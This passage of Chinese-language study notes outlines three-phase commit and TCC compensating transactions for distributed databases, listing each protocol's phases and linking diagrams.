### 3阶段

> 对Prepare阶段进行细化
>
> 引入了超时机制

1. 询问阶段：不执行事务操作，只询问是否能执行本地数据库事务操作
2. 准备阶段：所有参与者能执行后，才会开始执行本地数据库事务预操作redo、undo log写
3. 提交阶段：都操作完成后，提交事务

![image.png](java.assets/1632404119777-ff64ade3-a64f-48a5-93de-54789990bdd6.png)

#### 优点

通过加入了PreCommit解决了数据一致性问题





### TCC（补偿事务）

> 柔性事务代表

三个阶段

1. Try阶段：尝试执行，完成业务检查，并预留好业务资源
2. Confirm阶段：确认执行。当所有参与者的Try执行成功后，执行Confirm，处理预留资源。否则，进行Cancel
3. Cancel阶段：释放预留资源

![image.png](java.assets/1632404138972-0399a423-1e7c-458d-ba80-aca54e00a617.png)
